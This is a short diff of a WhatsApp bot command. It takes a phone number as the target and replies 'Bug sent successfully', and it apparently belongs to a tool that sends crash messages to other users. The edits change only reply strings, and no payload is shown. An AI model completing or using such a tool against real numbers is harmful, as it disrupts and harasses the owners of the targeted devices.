@@ -12,13 +12,13 @@ cmd({
 }, async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isOwner) {
-            return reply("❌ This command is for premium users only.");
+            return reply("❌ This command is for Owner Only.");
         }
         if (!q) {
             return reply(`\`Example:\` : ${prefix + command} 628×××`);
         }
         let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        reply(`✔️ Bug sent successfully to{target}. *Please wait for at least 5 minutes before trying again.*`);
+        reply(`✔️ Bug sent successfully to{target}.`);
         
 async function ngeloc(target, quoted) {
     try {
